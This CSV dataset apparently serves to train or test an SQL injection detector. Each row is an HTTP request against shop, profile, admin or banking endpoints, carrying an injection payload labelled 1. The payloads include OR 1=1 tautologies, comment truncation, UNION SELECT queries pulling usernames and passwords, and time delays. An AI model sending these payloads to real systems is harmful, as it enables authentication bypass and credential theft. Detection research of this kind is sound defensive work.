payload,label
"PATCH /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' --\"",\""category\"":\""gadgets\""}",1
"PUT /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' UNION SELECT null, username, password FROM users --\"",\""category\"":\""gadgets\""}",1
GET /search?q=camera' OR '1'='1' -- HTTP/1.1,1
"GET /search?q=camera' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /products?id=1' OR 1=1 -- HTTP/1.1,1
GET /profile?id=1' AND 1=1 -- HTTP/1.1,1
GET /cart?item_id=1' OR 'x'='x' -- HTTP/1.1,1
GET /user?id=1' -- HTTP/1.1,1
GET /search?q=camera' AND 1=1 -- HTTP/1.1,1
GET /checkout?id=1' OR 1=0 -- HTTP/1.1,1
"GET /orders?id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /search?q=camera' HAVING 1=1 -- HTTP/1.1,1
GET /comments?post_id=1' AND 'a'='a' -- HTTP/1.1,1
GET /profile?id=1' OR (SELECT COUNT(*) FROM users) > 0 -- HTTP/1.1,1
GET /product?id=1' AND 1=1; -- HTTP/1.1,1
GET /account?id=1' WAITFOR DELAY '00:00:05' -- HTTP/1.1,1
GET /blog?id=1' OR '1'='1' -- HTTP/1.1,1
GET /search?q=camera' AND '1'='1' -- HTTP/1.1,1
GET /users?id=1' OR 1=1 -- HTTP/1.1,1
GET /order?id=1' OR '1'='1' -- HTTP/1.1,1
GET /login?username=admin' -- HTTP/1.1,1
GET /comments?id=1' -- HTTP/1.1,1
GET /search?q=camera' -- HTTP/1.1,1
GET /admin?id=1' AND 'a'='b' -- HTTP/1.1,1
GET /orders?id=1' AND 1=0 -- HTTP/1.1,1
GET /search?q=camera' GROUP BY username -- HTTP/1.1,1
"GET /product?id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /cart?id=1' OR 1=1 -- HTTP/1.1,1
"GET /items?id=1' UNION SELECT null, null, password FROM users -- HTTP/1.1",1
GET /home?id=1' -- HTTP/1.1,1
GET /search?q=camera' OR '1'='1' -- HTTP/1.1,1
POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&password=admin,1
POST /register HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nemail=admin' --&password=admin,1
POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=anypassword,1
"POST /user/login HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR '1'='1' --\"",\""password\"":\""password\""}",1
"POST /search HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nquery=camera' UNION SELECT null, username, password FROM users --",1
POST /checkout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_info=' OR 1=1 --&address=NY,1
"POST /order HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":1,\""quantity\"":2,\""payment\"":\""cash' OR 1=1 --\""}",1
"POST /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nbio=camera' UNION SELECT null, username, password FROM users --",1
"POST /submit HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR 1=1 --\"",\""password\"":\""password\""}",1
"POST /submit HTTP/1.1\nContent-Type: application/json\n{\""comment\"":\""camera' OR '1'='1' --\""}",1
POST /add_to_cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=1' OR 1=1 --&quantity=1,1
POST /review HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nreview=camera' OR 'x'='x' --&product_id=1,1
"POST /checkout HTTP/1.1\nContent-Type: application/json\n{\""address\"":\""123 Main St' AND 1=1 --\"",\""payment_method\"":\""credit_card\""}",1
"POST /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=1' UNION SELECT null, username, password FROM users --",1
POST /feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment=camera' OR 1=1 --&user_id=1,1
POST /add_comment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment=camera' --&post_id=1,1
POST /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' OR '1'='1' --&quantity=2,1
"POST /search HTTP/1.1\nContent-Type: application/json\n{\""query\"":\""camera' HAVING 1=1 --\""}",1
POST /user HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nemail=admin' --&password=any,1
"POST /search HTTP/1.1\nContent-Type: application/json\n{\""query\"":\""camera' AND 1=1 --\""}",1
POST /update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' AND 1=1 --&password=admin,1
"POST /user/login HTTP/1.1\nContent-Type: application/json\n{\""email\"":\""admin@domain.com' OR 1=1 --\"",\""password\"":\""password\""}",1
POST /submit_feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nfeedback=camera' OR 'x'='x' --&user_id=1,1
POST /search HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nquery=camera' --&category=gadgets,1
"POST /login HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR 'x'='x' --\"",\""password\"":\""anypassword\""}",1
POST /logout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' --&session_id=abc123,1
PUT /update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&email=test@domain.com,1
"PUT /update HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR '1'='1' --\"",\""email\"":\""test@domain.com\""}",1
"PUT /profile HTTP/1.1\nContent-Type: application/json\n{\""bio\"":\""camera' OR 1=1 --\""}",1
PUT /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nname=camera' --&address=NYC,1
PUT /update_address HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naddress=camera' OR 1=1 --&user_id=123,1
"PUT /order HTTP/1.1\nContent-Type: application/json\n{\""order_id\"":1,\""status\"":\""canceled' OR 1=1 --\""}",1
"PUT /feedback HTTP/1.1\nContent-Type: application/json\n{\""comment\"":\""camera' UNION SELECT null, username, password FROM users --\""}",1
"PUT /post HTTP/1.1\nContent-Type: application/json\n{\""title\"":\""camera' OR 1=1 --\"",\""body\"":\""This is a test post.\""}",1
"PUT /item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=1' UNION SELECT null, username, password FROM users --",1
"PUT /update_status HTTP/1.1\nContent-Type: application/json\n{\""status\"":\""active' OR 1=1 --\"",\""user_id\"":1}",1
"PUT /update_profile HTTP/1.1\nContent-Type: application/json\n{\""name\"":\""admin' OR '1'='1' --\"",\""email\"":\""admin@domain.com\""}",1
PUT /change_password HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npassword=' OR 1=1 --&confirm_password=admin,1
PUT /checkout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_method=credit_card' OR 1=1 --&amount=100,1
PUT /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' --&status=canceled,1
PUT /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=1' --&quantity=5,1
PUT /update_user HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' --&name=John,1
PUT /update_item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=1' AND '1'='1 --&name=Gadget,1
"PUT /modify HTTP/1.1\nContent-Type: application/json\n{\""name\"":\""camera' UNION SELECT null, username, password FROM users --\""}",1
PUT /admin/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&role=admin,1
"PUT /status HTTP/1.1\nContent-Type: application/json\n{\""status\"":\""active' OR 1=1 --\"",\""user_id\"":1}",1
"PUT /comment HTTP/1.1\nContent-Type: application/json\n{\""comment\"":\""camera' OR '1'='1' --\"",\""post_id\"":1}",1
DELETE /item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=1' -- HTTP/1.1,1
DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' OR 1=1 -- HTTP/1.1,1
"DELETE /account HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1' --\"",\""action\"":\""delete\""}",1
"DELETE /post HTTP/1.1\nContent-Type: application/json\n{\""post_id\"":1' OR 1=1 --\"",\""action\"":\""delete\""}",1
DELETE /user HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' OR '1'='1' -- HTTP/1.1,1
"DELETE /comment HTTP/1.1\nContent-Type: application/json\n{\""comment_id\"":1' OR '1'='1' --\"",\""action\"":\""delete\""}",1
DELETE /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=1' -- HTTP/1.1,1
DELETE /review HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nreview_id=1' OR 1=1 -- HTTP/1.1,1
"DELETE /blog HTTP/1.1\nContent-Type: application/json\n{\""blog_id\"":1' OR 1=1 --\"",\""action\"":\""delete\""}",1
"DELETE /cart HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":1' --\"",\""action\"":\""remove\""}",1
DELETE /session HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsession_id=abc123' -- HTTP/1.1,1
"DELETE /account HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1' --\"",\""action\"":\""delete\""}",1
DELETE /user HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' AND 1=1 -- HTTP/1.1,1
"DELETE /post HTTP/1.1\nContent-Type: application/json\n{\""post_id\"":1' --\"",\""action\"":\""delete\""}",1
DELETE /comment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment_id=1' OR 1=1 -- HTTP/1.1,1
"DELETE /item HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":1' --\"",\""action\"":\""delete\""}",1
DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' AND 1=1 -- HTTP/1.1,1
DELETE /product HTTP/1.1\nContent-Type: application/json,1
GET /products/search?query=phone' OR '1'='1' -- HTTP/1.1,1
"GET /reviews?product_id=5' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /order/history?order_id=100' AND 1=1 -- HTTP/1.1,1
GET /users?id=1' AND '1'='1' -- HTTP/1.1,1
GET /search?query=tablet' OR 1=1 -- HTTP/1.1,1
GET /checkout?user_id=1' OR 'x'='x' -- HTTP/1.1,1
"GET /cart?item_id=3' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /account?user_id=1' OR 1=1 -- HTTP/1.1,1
GET /orders?order_id=123' OR '1'='1' -- HTTP/1.1,1
GET /products/detail?product_id=10' AND 1=1 -- HTTP/1.1,1
GET /users/profile?user_id=1' AND 'a'='a' -- HTTP/1.1,1
GET /search?query=phone' HAVING 1=1 -- HTTP/1.1,1
GET /categories?category_id=2' OR '1'='1' -- HTTP/1.1,1
"GET /post/view?post_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /login?username=admin' OR 1=1 -- HTTP/1.1,1
GET /items?item_id=5' OR 1=0 -- HTTP/1.1,1
"GET /profile?user_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /search?q=tv' AND 1=1 -- HTTP/1.1,1
GET /news?id=10' OR '1'='1' -- HTTP/1.1,1
GET /api/v1/products?category=electronics' OR 1=1 -- HTTP/1.1,1
GET /shop/cart?item_id=7' AND 1=1 -- HTTP/1.1,1
"GET /search?query=monitor' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /events?id=15' OR '1'='1' -- HTTP/1.1,1
GET /profile/view?user_id=1' -- HTTP/1.1,1
GET /login?username=admin' AND 1=1 -- HTTP/1.1,1
"GET /categories?id=5' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /posts?post_id=1' OR 1=1 -- HTTP/1.1,1
GET /articles?id=10' HAVING 1=1 -- HTTP/1.1,1
POST /user/signup HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&password=admin,1
"POST /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nbio=tv' UNION SELECT null, username, password FROM users --&address=NYC",1
POST /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_info=' OR 1=1 --&order_id=12,1
"POST /comments HTTP/1.1\nContent-Type: application/json\n{\""post_id\"":1,\""comment\"":\""tv' OR '1'='1' --\""}",1
"POST /submit HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR 1=1 --\"",\""password\"":\""password\""}",1
"POST /cart/add HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":10,\""quantity\"":2,\""user_id\"":\""1' OR 1=1 --\""}",1
POST /checkout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naddress=camera' OR 1=1 --&payment=card,1
"POST /product/review HTTP/1.1\nContent-Type: application/json\n{\""product_id\"":1,\""review\"":\""tv' UNION SELECT null, username, password FROM users --\""}",1
POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=password,1
POST /search HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nquery=camera' HAVING 1=1 --&category=gadgets,1
POST /cart/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=5' OR 1=1 --&quantity=3,1
POST /admin/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=7' OR 1=1 --&user_id=1,1
"POST /item/update HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":8,\""price\"":\""100' OR 1=1 --\"",\""quantity\"":5}",1
"POST /order/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=3' UNION SELECT null, username, password FROM users --&status=completed",1
"POST /api/v1/orders HTTP/1.1\nContent-Type: application/json\n{\""order_id\"":5,\""user_id\"":\""1' AND 1=1 --\"",\""status\"":\""shipped\""}",1
POST /comments HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment=camera' OR 1=1 --&post_id=3,1
"POST /review HTTP/1.1\nContent-Type: application/json\n{\""product_id\"":2,\""review\"":\""tv' OR 1=1 --\""}",1
POST /search HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nquery=phone' AND 1=1 --&category=electronics,1
"POST /cart HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":3,\""quantity\"":2,\""user_id\"":\""1' OR '1'='1' --\""}",1
POST /update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nprofile_id=1' OR 1=1 --&email=test@domain.com,1
POST /register HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=admin,1
"POST /admin HTTP/1.1\nContent-Type: application/json\n{\""action\"":\""delete_user\"",\""user_id\"":1' OR 'x'='x' --\""}",1
POST /feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nfeedback=camera' OR 1=1 --&user_id=1,1
POST /auth/login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=1234,1
"POST /settings/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""setting\"":\""dark' OR 1=1 --\""}",1
"PUT /update/item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=8' UNION SELECT null, username, password FROM users --&price=50",1
"PUT /user/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":2,\""email\"":\""admin@domain.com' OR '1'='1' --\"",\""username\"":\""admin\""}",1
PUT /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=9' AND 1=1 --&price=20,1
PUT /profile HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nbio=camera' OR 'x'='x' --&email=test@domain.com,1
PUT /cart/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=3' OR 1=1 --&quantity=4,1
PUT /checkout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_method=credit_card' OR 1=1 --&amount=200,1
"PUT /admin HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""status\"":\""active' OR 1=1 --\""}",1
"PUT /profile HTTP/1.1\nContent-Type: application/json\n{\""bio\"":\""camera' OR 1=1 --\"",\""user_id\"":1}",1
PUT /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=3' OR 1=1 --&status=completed,1
PUT /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=4' --&quantity=5,1
"PUT /comment HTTP/1.1\nContent-Type: application/json\n{\""comment_id\"":2,\""body\"":\""camera' OR 'x'='x' --\""}",1
"PUT /items/update HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":5,\""price\"":\""100' OR 1=1 --\"",\""quantity\"":3}",1
"PUT /admin/settings HTTP/1.1\nContent-Type: application/json\n{\""setting\"":\""dark' OR 1=1 --\"",\""user_id\"":1}",1
"PUT /review HTTP/1.1\nContent-Type: application/json\n{\""review\"":\""camera' UNION SELECT null, username, password FROM users --\"",\""product_id\"":1}",1
PUT /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=admin,1
"PUT /update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""setting\"":\""dark' OR 1=1 --\""}",1
"PUT /account/update HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""status\"":\""active' OR 1=1 --\""}",1
PUT /settings/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntheme=dark' OR 1=1 --&user_id=1,1
PUT /order/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=100' OR 1=1 --&status=shipped,1
"PUT /admin/settings HTTP/1.1\nContent-Type: application/json\n{\""theme\"":\""dark' OR 1=1 --\"",\""user_id\"":1}",1
PUT /product/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=5' AND 1=1 --&price=100,1
DELETE /item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=6' OR 1=1 --&user_id=1,1
DELETE /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=5' OR 1=1 --&quantity=2,1
DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=100' AND 1=1 --&status=shipped,1
"DELETE /comment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment_id=4' UNION SELECT null, username, password FROM users --&user_id=1",1
DELETE /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=2' OR 1=1 --&category=electronics,1
DELETE /users HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' OR 'x'='x' --&username=admin,1
DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=5' OR 1=1 --&user_id=1,1
DELETE /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=7' OR 1=1 --&user_id=1,1
DELETE /products HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=5' --&user_id=1,1
DELETE /feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nfeedback_id=3' OR 1=1 --&user_id=1,1
DELETE /admin HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' OR 1=1 --&action=delete,1
DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=200' OR 1=1 --&user_id=1,1
DELETE /item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=7' OR 1=1 --&quantity=1,1
"DELETE /reviews HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nreview_id=1' UNION SELECT null, username, password FROM users --&user_id=1",1
DELETE /users HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=5' AND 1=1 --&action=delete,1
"DELETE /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=1' UNION SELECT null, username, password FROM users --&quantity=10",1
DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=10' --&status=shipped,1
DELETE /admin HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naction=delete' OR '1'='1' --&user_id=5,1
DELETE /items HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=9' OR 1=1 --&quantity=5,1
"DELETE /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=5' UNION SELECT null, username, password FROM users --&quantity=10",1
"PATCH /user HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""username\"":\""admin' OR 1=1 --\"",\""password\"":\""newpassword\""}",1
"PATCH /order HTTP/1.1\nContent-Type: application/json\n{\""order_id\"":5,\""status\"":\""shipped' OR 1=1 --\"",\""user_id\"":1}",1
PATCH /settings HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsetting_id=1' AND 1=1 --&status=enabled,1
"PATCH /profile HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""bio\"":\""tv' OR 1=1 --\"",\""location\"":\""NYC\""}",1
"PATCH /comment HTTP/1.1\nContent-Type: application/json\n{\""comment_id\"":2,\""body\"":\""camera' UNION SELECT null, username, password FROM users --\""}",1
PATCH /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=3' OR 1=1 --&price=100,1
"PATCH /order HTTP/1.1\nContent-Type: application/json\n{\""order_id\"":5,\""status\"":\""completed' OR 1=1 --\"",\""user_id\"":1}",1
PATCH /feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nfeedback_id=3' OR 1=1 --&status=resolved,1
"PATCH /item HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":4,\""status\"":\""sold' UNION SELECT null, username, password FROM users --\""}",1
"PATCH /admin HTTP/1.1\nContent-Type: application/json\n{\""action\"":\""update\"",\""user_id\"":2,\""status\"":\""active' OR 1=1 --\""}",1
PATCH /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=5' OR 1=1 --&quantity=4,1
"PATCH /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=8' UNION SELECT null, username, password FROM users --&price=50",1
"PATCH /user/settings HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""theme\"":\""dark' OR 1=1 --\""}",1
"PATCH /profile HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""email\"":\""admin' OR 1=1 --@domain.com\""}",1
"PATCH /account HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""status\"":\""active' OR 1=1 --\""}",1
"PATCH /product HTTP/1.1\nContent-Type: application/json\n{\""product_id\"":1,\""status\"":\""available' OR 1=1 --\""}",1
PATCH /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' OR 1=1 --&payment=done,1
"PATCH /admin HTTP/1.1\nContent-Type: application/json\n{\""action\"":\""update\"",\""user_id\"":3,\""status\"":\""active' OR 1=1 --\""}",1
GET /account/details?account_number=12345' OR '1'='1' -- HTTP/1.1,1
"GET /transactions?account_id=1001' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /balance?user_id=1' AND '1'='1' -- HTTP/1.1,1
GET /transfer/history?user_id=1' AND '1'='1' -- HTTP/1.1,1
GET /login?username=admin' OR 1=1 -- HTTP/1.1,1
GET /account/statement?account_number=2001' AND 1=1 -- HTTP/1.1,1
"GET /loan/details?loan_id=5' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /transactions?account_number=1234' AND 'x'='x' -- HTTP/1.1,1
"GET /user/transactions?user_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /accounts?account_id=1' AND '1'='1' -- HTTP/1.1,1
GET /account/overview?account_id=1' OR '1'='1' -- HTTP/1.1,1
GET /search?query=balance' HAVING 1=1 -- HTTP/1.1,1
GET /user/loan?user_id=1' OR '1'='1' -- HTTP/1.1,1
GET /account/transactions?account_number=5001' AND 1=1 -- HTTP/1.1,1
GET /payment/overview?payment_id=8' OR '1'='1' -- HTTP/1.1,1
GET /profile?user_id=1' -- HTTP/1.1,1
GET /customer/details?customer_id=7' OR '1'='1' -- HTTP/1.1,1
"GET /loans?user_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /funds/transfer?sender_account=1234' OR '1'='1' -- HTTP/1.1,1
"GET /credit/card/details?card_number=1234' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /customer/account?account_id=3' AND 1=1 -- HTTP/1.1,1
